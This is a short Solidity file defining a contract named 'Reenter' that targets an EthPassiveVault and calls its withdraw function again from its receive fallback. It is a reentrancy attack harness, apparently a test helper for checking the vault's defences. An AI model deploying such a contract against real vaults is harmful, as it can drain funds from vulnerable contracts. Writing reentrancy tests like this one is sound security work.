// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {EthPassiveVault} from "src/EthPassiveVault.sol";

// contract to reenter the withdraw function
contract Reenter {
    EthPassiveVault public victim;

    constructor(address payable _victim) {
        victim = EthPassiveVault(_victim);
    }

    function _attack() internal {
        victim.withdraw();
    }

    receive() external payable {
        _attack();
    }
}
